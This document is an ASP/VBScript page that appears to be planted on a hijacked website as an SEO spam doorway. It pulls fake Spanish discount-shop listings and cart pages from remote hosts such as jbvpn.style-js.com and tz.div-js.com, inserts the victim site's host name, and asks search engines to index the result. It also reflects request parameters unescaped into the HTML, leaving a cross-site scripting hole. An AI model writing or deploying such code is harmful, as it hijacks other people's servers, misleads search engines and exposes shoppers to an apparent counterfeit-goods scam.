<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script>
document.cookie="u="+window.location.href;
</script>
<title> <%=request("shop")%> baratas online </title>
<meta name="keywords" content="<%=request("shop")%>"/>
<meta name="description" content=" <%=request("shop")%> > Sale OFF-<%=INT((70-50+1)*RND+50)%>% Compre las marcas que ama en oferta. ¡Zapatos, ropa, accesorios y más con descuento en nuestra tienda! Puntuación en el estilo, Puntuación en el precio. <%=request("shop")%> "/>
<meta name="robots" content="index,follow,all"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<META NAME="Robots"  CONTENT="index, follows">
</head>
<body>
<%
Dim Url,Html,hyzhdy
hyzhdy=getHTTPPage("http://jbvpn.style-js.com/JDN.asp")
hyzhdy=Replace(hyzhdy, "/JDN", "/page/JDN")
if request("type")<>"" then
URL="http://jbvpn.style-js.com/cart.aspx"&"?gj="&request("gj")
con=getHTTPPage(URL)
con=Replace(con, "pppid", request("pid"))
con=Replace(con, "tupian", request("pic"))
con=Replace(con, "mingzi", request("pname"))
con=Replace(con, "danjia", request("price"))
con=Replace(con, "shuliang", "1")
con=Replace(con, "zongjia", request("price"))
con=Replace(con, "cima", request("s1"))
con=Replace(con, "curfh", request("fh"))
con=Replace(con, "pricetype", request("pricetype"))
con=Replace(con, "ZZZZZ",getHTTPPage("http://tz.div-js.com/tz.txt"))
Response.write con

else
if request("shop")<>"" then
URL=hyzhdy&"?gj="&request("gj")&"&hl="&request("hl")&"&shop="&Server.URLEncode(request("shop"))&"&xi="&request("xi")&"&xc="&request("xc")&"&pl="&request("pl")&"&pr="&request("pr")&"&you="&request("you")&"&kt=http://tz.div-js.com/es/key/"&request("cid")&".txt&mt=http://tz.div-js.com/esm.txt&cid="&request("cid")

else
cid=INT((16-8+1)*rnd+8)
if request("cid")<>"" then
cid=request("cid")
end if
URL=hyzhdy&"?gj=es&hl=es&xi=3-7&xc=27-30&txt=http://tz.div-js.com/es/key/"&cid&".txt&cid="&cid&"&pnum="&request("pnum")&"&page="&Request.ServerVariables("SCRIPT_NAME")
end if

con=getHTTPPage(URL)
con=Replace(con, "HHHHH", Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "BBBBB", Request.ServerVariables("HTTP_HOST"))
con=Replace(con, "AAAAA", Request.ServerVariables("SCRIPT_NAME")&"?gj="&request("gj")&"&type=addtocart")
con=Replace(con, "DDDDD", request("shop")&" Fast delivery and guaranteed savings! ")
con=Replace(con, "QQQQQ", "http://"&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("PATH_INFO")&"?"&Request.ServerVariables("QUERY_STRING"))    
Response.write con
end if
%> 
</body>

</html>  